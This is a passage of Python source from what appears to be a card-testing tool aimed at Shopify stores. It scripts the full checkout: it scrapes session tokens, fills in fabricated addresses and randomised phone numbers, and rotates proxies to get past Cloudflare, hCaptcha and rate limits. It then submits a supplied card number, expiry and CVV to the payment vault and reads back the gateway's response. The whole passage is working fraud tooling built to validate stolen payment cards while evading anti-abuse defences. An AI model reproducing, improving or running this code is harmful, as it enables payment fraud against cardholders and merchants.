                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)

            if 'shop.app' in checkout_url or 'shop-pay' in checkout_url or 'shoppay' in checkout_url:
                return False, "Shop Pay redirection (site not supported)", gateway, total_price, currency

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            text = await response.text()
            sst = extract_session_token(text, response.headers)

            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')

            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
            original_currency = currency

            site_cc = extract_between(text, 'countryCode&quot;:&quot;', '&quot;') or extract_between(text, '"countryCode":"', '"')
            if not site_cc:
                site_cc_match = re.search(r'Shopify\.country\s*=\s*["\']([A-Z]{2})["\']', text)
                if site_cc_match:
                    site_cc = site_cc_match.group(1)

            if site_cc and len(site_cc) == 2 and site_cc.upper() != country_code:
                new_cc = site_cc.upper()
                if new_cc in book:
                    address_info = book[new_cc]
                    country_code = address_info["countryCode"]
                    phone = address_info.get("phone", "2125550000")
                    if len(phone) > 4:
                        phone = phone[:-4] + str(random.randint(1000, 9999))
                    else:
                        phone = phone + str(random.randint(1000, 9999))
                    street = address_info.get("address1", "123 Main St")
                    street = f"{street} Apt {random.randint(1, 999)}"
                    city = address_info.get("city", "New York")
                    state = address_info.get("zoneCode", "NY")
                    s_zip = address_info.get("postalCode", "10001")
                else:
                    country_code = new_cc
                    state = ""
                    s_zip = ""
                    phone = "212" + str(random.randint(1000000, 9999999))

            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            taxes_included = False
            if 'taxesIncluded&quot;:true' in text or '"taxesIncluded":true' in text:
                taxes_included = True

            requires_shipping = True
            if 'requiresShipping&quot;:false' in text or '"requiresShipping":false' in text:
                requires_shipping = False

            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')

            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
                ident_sig = ident_match.group(1)

            if not sst:
                logger.warning(f"[SESSION TOKEN FAIL] status={response.status} url={checkout_url} text_len={len(text)}")
                await asyncio.sleep(random.uniform(0.5, 1.2))
                try:
                    retry_proxy = proxy
                    fallbacks = _get_fallback_proxies(uid)
                    if fallbacks:
                        valid_fallbacks = [fb for fb in fallbacks if fb != proxy]
                        if valid_fallbacks:
                            retry_proxy = random.choice(valid_fallbacks)
                        else:
                            retry_proxy = random.choice(fallbacks)
                        logger.info(f"[SESSION TOKEN RETRY] Rotating proxy from {proxy} to {retry_proxy}")

                    cart_resp2 = await session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=retry_proxy)
                    await cart_resp2.read()
                    response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=retry_proxy)
                    checkout_url = str(response.url)
                    text = await response.text()
                    sst = extract_session_token(text, response.headers)
                    if sst:
                        proxy = retry_proxy
                except Exception as e:
                    logger.error(f"[SESSION TOKEN RETRY] Failed during retry: {e}")
                    pass
                if not sst:
                    is_cf = "cloudflare" in text.lower() or "challenge" in text.lower() or (response is not None and response.status == 403)
                    err_msg = "Proxy Error: Cloudflare block on checkout" if is_cf else "Proxy Error: Failed to get session token"
                    return False, err_msg, gateway, total_price, currency

            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}

            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            await asyncio.sleep(random.uniform(0.2, 0.6))

            captcha_retries = 0
            for i in range(8):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if not response:
                    if i < 2:
                        await asyncio.sleep(0.5 * (i + 1))
                        continue
                    break
                if is_captcha_required(resp_text):
                    captcha_retries += 1
                    if captcha_retries > 2:
                        return False, "Proxy Error: security check", gateway, total_price, currency
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        headers['Origin'] = ourl
                    await asyncio.sleep(1.5)
                    continue

                try:
                    resp_json = safe_json_loads(resp_text)
                    if not resp_json:
                        return False, "Invalid JSON response", gateway, total_price, currency
                except Exception as e:
                    return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

                if 'errors' in resp_json:
                    logger.debug(f"GraphQL Error response: {resp_text[:500]}")
                    errors = resp_json.get('errors', [])
                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

                try:
                    session_data = (resp_json.get('data') or {}).get('session') or {}
                    if not session_data:
                        result = {}
                    else:
                        result = (session_data.get('negotiate') or {}).get('result') or {}
                    result_type = result.get('__typename', '')
                    if result_type == 'Throttled':
                        queueToken = result.get('queueToken') or queueToken
                        json_data['variables']['queueToken'] = queueToken
                        poll_after = result.get('pollAfter', 2.0)
                        if i < 7:
                            await asyncio.sleep(float(poll_after))
                            continue
                        else:
                            return False, "Rate Limit (Throttled)", gateway, total_price, currency
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
                try:
                    seller_proposal = ((((resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}).get('sellerProposal') or {}
                    is_shipping_required = seller_proposal.get('isShippingRequired', True)
                    res_type = (seller_proposal.get('delivery') or {}).get('__typename')

                    captcha_field = seller_proposal.get('captcha') or {}
                    if captcha_field and captcha_field.get('__typename') == 'Captcha' and captcha_field.get('sitekey'):
                        captcha_token = captcha_field.get('token')
                        captcha_provider = captcha_field.get('provider', 'hcaptcha')

                        if captcha_token:
                            captcha_retries += 1
                            if captcha_retries <= 2:
                                json_data['variables']['captcha'] = {
                                    'provider': captcha_provider,
                                    'token': captcha_token
                                }
                                await asyncio.sleep(0.5)
                                continue

                        captcha_retries += 1
                        if captcha_retries <= 2:
                            new_proxy = _rotate_fallback_proxy(proxy)
                            if new_proxy and new_proxy != proxy:
                                proxy = new_proxy
                            await asyncio.sleep(2.0)
                            json_data['variables'].pop('captcha', None)
                            continue
                        return False, "Proxy Error: hCaptcha", gateway, total_price, currency

                    if not is_shipping_required or res_type == 'FilledDeliveryTerms':
                        break
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
                poll_after_ms = result.get('pollAfter', 0.15) if result_type == 'Throttled' else 0.15
                await asyncio.sleep(float(poll_after_ms))

            if not response:
                return False, f"Proxy Error: Request failed: {resp_text}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency

                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency

                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency

                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency

                result_type = result.get('__typename', 'Unknown')

                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency

                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency

                # التحسين: تحديث checkpointData و queueToken فقط إذا كانا موجودين
                if result.get('checkpointData'):
                    checkpoint_data = result.get('checkpointData')
                if result.get('queueToken'):
                    queueToken = result.get('queueToken')

                seller_proposal = result.get('sellerProposal')
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency

                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')

                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency

                running_total = running_total_data['value']['amount']
                proposal_currency = running_total_data['value'].get('currencyCode')
                if proposal_currency:
                    currency = proposal_currency
                    original_currency = currency

                try:
                    merch_data = seller_proposal.get('merchandise', {}).get('merchandiseLines', [])
                    if merch_data and len(merch_data) > 0:
                        merch_amt = merch_data[0].get('totalAmount', {}).get('value', {}).get('amount')
                        if merch_amt is not None:
                            subtotal = str(merch_amt)
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            is_shipping_required = seller_proposal.get('isShippingRequired', True)
            if _cached_requires_shipping is False:
                is_shipping_required = False

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency

            delivery_type = delivery_data.get('__typename', '')

            pending_attempts = 0
            while delivery_type == 'PendingTerms' and pending_attempts < MAX_PENDING_ATTEMPTS:
                pending_attempts += 1
                poll_delay_ms = delivery_data.get('pollDelay', 800)
                wait_time = min((poll_delay_ms / 1000.0) * (1 + pending_attempts * 0.2), 3.0)
                await asyncio.sleep(wait_time)

                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                if response:
                    try:
                        retry_json = safe_json_loads(resp_text)
                        if retry_json:
                            retry_seller = retry_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                            if retry_seller:
                                delivery_data = retry_seller.get('delivery', delivery_data)
                                running_total_data = retry_seller.get('runningTotal', running_total_data)
                                if running_total_data and running_total_data.get('__typename') != 'PendingTerms':
                                    if 'value' in running_total_data and 'amount' in running_total_data['value']:
                                        running_total = running_total_data['value']['amount']
                                seller_proposal = retry_seller
                    except Exception as exc:
                        logger.debug("Suppressed exception: %s", exc, exc_info=True)
                delivery_type = delivery_data.get('__typename', '') if delivery_data else ''

            if pending_attempts >= MAX_PENDING_ATTEMPTS:
                return False, "PENDING_TIMEOUT", gateway, total_price, currency

            delivery_line_id = ''

            has_delivery_lines = False
            has_destination = True
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
                shipping_amount_str = '0.00'
                delivery_lines = delivery_data.get('deliveryLines', [])
                if delivery_lines and len(delivery_lines) > 0:
                    has_delivery_lines = True
                    delivery_line_id = delivery_lines[0].get('id', '')
                    if delivery_lines[0].get('destinationAddress') is None:
                        has_destination = False
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [])
                if delivery_lines and len(delivery_lines) > 0:
                    has_delivery_lines = True
                    delivery_line_id = delivery_lines[0].get('id', '')
                    if delivery_lines[0].get('destinationAddress') is None:
                        has_destination = False
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        try:
                            def get_strat_price(s):
                                try:
                                    return float(s.get('amount', {}).get('value', {}).get('amount', '0'))
                                except:
                                    return 999999.0
                            available_strategies = sorted(available_strategies, key=get_strat_price)
                        except Exception as exc:
                            logger.debug("Suppressed exception: %s", exc, exc_info=True)
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_str = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_str)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                        shipping_amount_str = '0.00'
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                    shipping_amount_str = '0.00'
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
                shipping_amount_str = '0.00'

            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_str = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_str)
                else:
                    tax_amount = 0.0
                    tax_amount_str = '0.00'
            except:
                tax_amount = 0.0
                tax_amount_str = '0.00'

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])

                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    typename = payment_method.get('__typename', '')
                    name = str(payment_method.get('name') or '').lower()

                    if any(w in name for w in ['paypal', 'apple_pay', 'google_pay', 'shop_pay', 'cash_on_delivery', 'cod']):
                        continue

                    if typename == 'PaymentProvider' or (payment_method.get('brands') or payment_method.get('paymentBrands')):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        try:
                            rate = EXCHANGE_RATES.get(currency.upper(), 1.0)
                            if currency.upper() != "USD" and rate != 1.0:
                                t_amt = round(float(running_total) * rate, 2)
                                subtotal = round(float(subtotal) * rate, 2)
                                tax_amount_str = round(float(tax_amount_str) * rate, 2)
                                shipping_amount_str = round(float(shipping_amount_str) * rate, 2)
                                display_currency = "USD"
                            else:
                                t_amt = round(float(running_total), 2)
                                display_currency = currency
                        except:
                            t_amt = round(float(running_total), 2)
                            display_currency = currency

                        total_price = f"{format_price(t_amt, display_currency)} [Min Prod: {format_price(subtotal, display_currency)} | Tax: {format_price(tax_amount_str, display_currency)} | Ship: {format_price(shipping_amount_str, display_currency)}]"
                        break

                if not payment_identifier:
                    for method in payment_methods:
                        payment_method = method.get('paymentMethod', {})
                        if payment_method.get('paymentMethodIdentifier'):
                            payment_identifier = payment_method.get('paymentMethodIdentifier')
                            gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                            t_amt = round(float(running_total), 2)
                            total_price = f"{format_price(t_amt, currency)} [Min Prod: {format_price(subtotal, currency)} | Tax: {format_price(tax_amount_str, currency)} | Ship: {format_price(shipping_amount_str, currency)}]"
                            break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            subtotal_str = subtotal
            json_data['query'] = QUERY_PROPOSAL_DELIVERY

            json_data['variables']['queueToken'] = queueToken or ''
            # التحسين: إزالة checkpointData إذا كان فارغاً
            if checkpoint_data:
                json_data['variables']['checkpointData'] = checkpoint_data
            else:
                json_data['variables'].pop('checkpointData', None)

            json_data['variables']['buyerIdentity']['customer']['presentmentCurrency'] = currency
            json_data['variables']['taxes']['proposedTotalAmount']['value']['currencyCode'] = currency

            if 'merchandiseLines' in json_data['variables']['merchandise'] and json_data['variables']['merchandise']['merchandiseLines']:
                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['currencyCode'] = currency
                json_data['variables']['merchandise']['merchandiseLines'][0]['expectedTotalPrice']['value']['amount'] = subtotal_str

            if not is_shipping_required:
                json_data['variables']['delivery']['deliveryLines'] = []
                json_data['variables']['delivery']['noDeliveryRequired'] = [{'stableId': stableId or '1'}]
            else:
                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy if delivery_strategy else '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                    'lines': [{'stableId': stableId or '1'}]
                }
                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                    'value': {'amount': shipping_amount_str, 'currencyCode': currency}
                }

            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)

            for attempt in range(4):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )

                if is_captcha_required(resp_text):
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        await asyncio.sleep(1.5)
                        continue
                    return False, "Proxy Error: security check on delivery", gateway, total_price, currency

                try:
                    second_resp_json = safe_json_loads(resp_text)
                    if not second_resp_json:
                        continue
                    sec_neg = (((second_resp_json.get('data') or {}).get('session') or {}).get('negotiate') or {})
                    sec_res = sec_neg.get('result') or {}

                    if sec_res.get('__typename') == 'Throttled':
                        queueToken = sec_res.get('queueToken') or queueToken
                        json_data['variables']['queueToken'] = queueToken
                        poll_after = sec_res.get('pollAfter', 0.2)
                        await asyncio.sleep(float(poll_after))
                        continue

                    if sec_res.get('__typename') == 'NegotiationResultAvailable':
                        # التحسين: تحديث checkpointData فقط إذا كان موجوداً
                        if sec_res.get('checkpointData'):
                            checkpoint_data = sec_res.get('checkpointData')
                        if sec_res.get('queueToken'):
                            queueToken = sec_res.get('queueToken')
                        sec_seller = sec_res.get('sellerProposal') or {}

                        sec_running = ((sec_seller.get('runningTotal') or {}).get('value') or {}).get('amount')
                        if sec_running:
                            running_total = str(sec_running)

                        sec_tax = sec_seller.get('tax') or {}
                        if sec_tax.get('__typename') == 'FilledTaxTerms':
                            tax_amount_str = ((sec_tax.get('totalTaxAmount') or {}).get('value') or {}).get('amount', '0')
                            tax_amount = float(tax_amount_str)

                        sec_delivery = sec_seller.get('delivery') or {}
                        if sec_delivery.get('__typename') == 'FilledDeliveryTerms':
                            sec_lines = sec_delivery.get('deliveryLines') or [{}]
                            if sec_lines and len(sec_lines) > 0:
                                delivery_line_id = sec_lines[0].get('id', '')
                                available_strategies = sec_lines[0].get('availableDeliveryStrategies') or []
                                if available_strategies and len(available_strategies) > 0:
                                    try:
                                        def get_strat_price(s):
                                            try:
                                                return float(s.get('amount', {}).get('value', {}).get('amount', '0'))
                                            except:
                                                return 999999.0
                                        available_strategies = sorted(available_strategies, key=get_strat_price)
                                    except Exception as exc:
                                        logger.debug("Suppressed exception: %s", exc, exc_info=True)
                                    delivery_strategy = available_strategies[0].get('handle', '')
                                    shipping_amount_str = ((available_strategies[0].get('amount') or {}).get('value') or {}).get('amount', '0')
                                    try:
                                        shipping_amount = float(shipping_amount_str)
                                    except:
                                        shipping_amount = 0.0
                            break
                except Exception as exc:
                    logger.debug("Suppressed exception: %s", exc, exc_info=True)
                if attempt < 3:
                    await asyncio.sleep(0.2)

            try:
                t_amt = round(float(running_total), 2)
                total_price = f"{format_price(t_amt, currency)} [Min Prod: {format_price(subtotal, currency)} | Tax: {format_price(tax_amount_str, currency)} | Ship: {format_price(shipping_amount_str, currency)}]"
            except Exception as exc:
                logger.debug("Suppressed exception: %s", exc, exc_info=True)
            if is_shipping_required and not delivery_strategy:
                total_price = "0.00"
            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano) if int(ano) > 100 else int(ano) + 2000,
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }

            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig

            response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            try:
                token_data = await response.json()
                token = token_data.get('id')
                if not token:
                    return False, 'Proxy Error: Unable to get payment token', gateway, total_price, currency
            except Exception as e:
                await response.read()
                return False, f'Proxy Error: Unable to get payment token: {str(e)}', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}

            delivery_line_item = {
                'targetMerchandiseLines': {
                    'lines': [{'stableId': stableId or '1'}]
                },
                'deliveryMethodTypes': ['SHIPPING'],
                'expectedTotalPrice': {
                    'value': {'amount': shipping_amount_str, 'currencyCode': currency}
                },
                'destinationChanged': False
            }
            if has_destination or is_shipping_required:
                delivery_line_item['destination'] = {
                    'streetAddress': {
                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }
                }
            if delivery_strategy:
                delivery_line_item['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy,
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
            elif not has_delivery_lines:
                delivery_line_item['selectedDeliveryStrategy'] = None
            else:
                delivery_line_item['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                }

            if check_only:
                return True, "Site Checked", gateway, total_price, currency

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [delivery_line_item] if has_delivery_lines else [],
                        'noDeliveryRequired': [] if has_delivery_lines else [{'stableId': stableId or '1'}],
                        'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {
                                'value': {'amount': subtotal_str, 'currencyCode': currency}
                            },
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {
                                'value': {'amount': running_total, 'currencyCode': currency}
                            },
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': tax_amount_str, 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }

            # التحسين: إزالة checkpointData إذا كان فارغاً
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            else:
                submit_variables['input'].pop('checkpointData', None)

            rid = None
            for attempt in range(4):
                submit_json_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': submit_variables,
                    'operationName': 'SubmitForCompletion'
                }

                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
                )

                if not response:
                    if attempt < 3:
                        await asyncio.sleep(0.8 * (attempt + 1))
                        continue
                    break

                if is_captcha_required(text):
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        await asyncio.sleep(1.5)
                        continue
                    return False, "Proxy Error: security check on submit", gateway, total_price, currency

                # التحسين: معالجة RATE_LIMIT مع تدوير البروكسي
                if "429" in text or "Too Many Requests" in text:
                    logger.warning(f"[RATE_LIMIT] Rate limit detected, rotating proxy...")
                    new_proxy = _rotate_fallback_proxy(proxy)
                    if new_proxy and new_proxy != proxy:
                        proxy = new_proxy
                        logger.info(f"[RATE_LIMIT] Proxy rotated to {proxy}")
                    await asyncio.sleep(30)
                    continue

                if "Your order total has changed." in text:
                    try:
                        submit_variables['input']['payment']['paymentLines'][0]['amount'] = {'any': True}
                        if 'totalAmount' in submit_variables['input']['payment']:
                            submit_variables['input']['payment']['totalAmount'] = {'any': True}
